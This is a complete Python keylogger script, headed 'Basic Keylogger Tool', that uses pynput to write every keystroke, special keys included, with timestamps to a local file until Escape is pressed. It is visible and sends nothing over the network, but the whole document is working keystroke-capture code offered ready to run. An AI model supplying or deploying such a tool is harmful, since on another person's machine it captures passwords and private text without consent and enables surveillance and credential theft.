from pynput import keyboard
import time

# Define the log file name
LOG_FILE = "keystrokes_log.txt"

def on_press(key):
    """Handles key press events."""
    try:
        # Get the character representation of the key
        char = key.char
        log_key(char)
    except AttributeError:
        # Handle special keys (e.g., Space, Enter, Shift)
        # We replace the key name with a readable format enclosed in brackets
        special_key = str(key).replace('Key.', '')
        log_key(f"[{special_key}]")

def log_key(text):
    """Writes the captured text to the log file."""
    # Get the current time for the log entry
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"{timestamp}: {text}\n"
    
    # Write to the file
    with open(LOG_FILE, "a") as f:
        f.write(log_entry)

def on_release(key):
    """Handles key release events. Used to stop the listener."""
    # Pressing the Escape key will stop the keylogger
    if key == keyboard.Key.esc:
        print("\nKeylogger stopped by user (Escape key pressed).")
        # Stop listener
        return False

def main():
    """Sets up and starts the key listener."""
    print("--- Basic Keylogger Tool ---")
    print(f"Logging keystrokes to: {LOG_FILE}")
    print("Press the [ESC] key at any time to stop the logger.")
    print("-" * 35)

    # Start the listener thread
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
        
    print(f"Logging finished. Check {LOG_FILE} for results.")

if __name__ == "__main__":
    main()
